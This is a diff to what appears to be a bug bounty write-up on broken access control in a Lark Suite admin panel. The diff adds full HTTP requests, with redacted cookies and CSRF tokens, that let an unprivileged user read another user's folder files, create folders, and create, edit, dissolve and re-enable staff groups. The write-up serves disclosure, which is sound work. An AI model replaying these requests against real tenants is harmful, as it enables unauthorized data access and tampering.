@@ -89,7 +89,15 @@ GET  /suite/admin/space_manage/user_folder?userID=6782777787976515850  HTTP/1.1
 On the above request we appended another token in the *parameter query* and added a *parentToken* and we gave its *value* as the _user's folder token_ we got in the response of the above request. Request looks something like this:
 
 ```http
-GET  /suite/admin/space_manage/user_folder?userID=6782777787976515850&parentToken=nodusaSEPbExvXtWY01IboMcwQf  HTTP/1.1
+GET  /suite/admin/space_manage/user_folder?userID=[UserId]&parentToken=[PToken]  HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Timezone-Offset: 600
+X-Csrf-Token: <value>
+credentials: same-origin
+Cache-Control: no-cache
+Cookie:<value>
+
 ```
 The response of this request returned us all of the *files* inside that parent directoryand we were able to *view the files inside that folder*.
 
@@ -99,6 +107,15 @@ Moving a step further, we tried if we can *create new files* inside that *folder
 
 ```http
 POST  /suite/admin/space_manage/user_folder  HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Timezone-Offset: 600
+X-Csrf-Token: <value>
+credentials: same-origin
+Cache-Control: no-cache
+Cookie:<value>
+
+
 ```
 We used the *leaking directory tokens* in this request and response was **200 ok** and upon confirmation we found *new sub directory* was created in that folder.
 
@@ -120,12 +137,75 @@ We sent this `http` request and returned us the *data of the* all of the groups 
 
 ```http
 GET  /suite/admin/tenant/chatSetting?_t=1603952121293  HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Csrf-Token: <VALUE>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+credentials: same-origin
+Content-Type: application/json;charset=UTF-8
+Cookie: <VALUE>
+
 ```
 Spending a time with this *unusual behaviour* we found a few more *issues* on this feature. As an unprivileged user we were ablt to escalate our *privileges* and we identified various issues which are as *under*:
 
-- Creating new staff groups in the organization
+- Creating new staff groups in the organization using this HTTP request
+```http
+POST /suite/admin/tenant/chat HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Csrf-Token: <VALUE>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+credentials: same-origin
+Content-Type: application/json;charset=UTF-8
+Cookie: <VALUE>
+
+{"employeeTypes":[1,2,3,4,5],"chatName":"imranparrayx"}
+```
+
 - Editing settings of various staff groups of Admin
-- Deleting staff group
+
+```http
+PATCH /suite/admin/tenant/chat HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Csrf-Token: <VALUE>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+credentials: same-origin
+Content-Type: application/json;charset=UTF-8
+Cookie: <VALUE>
+
+{"employeeTypes":[1,2,4,5],"ownerID":"6782777787976515850","chatName":"Admins-Group"}
+```
+
+- Deleting/Disabling staff group
+
+```http
+POST /suite/admin/tenant/dissolve_chat HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Csrf-Token: <VALUE>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+credentials: same-origin
+Content-Type: application/json;charset=UTF-8
+Cookie: <VALUE>
+
+```
+
+- Re Enabling All Staff Group
+
+
+```http
+POST /suite/admin/tenant/normalize_chat HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Csrf-Token: <VALUE>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+credentials: same-origin
+Content-Type: application/json;charset=UTF-8
+Cookie: <VALUE>
+
+```
+
 
 ![1](/blog/assets/images/lark/2/2.png)
 
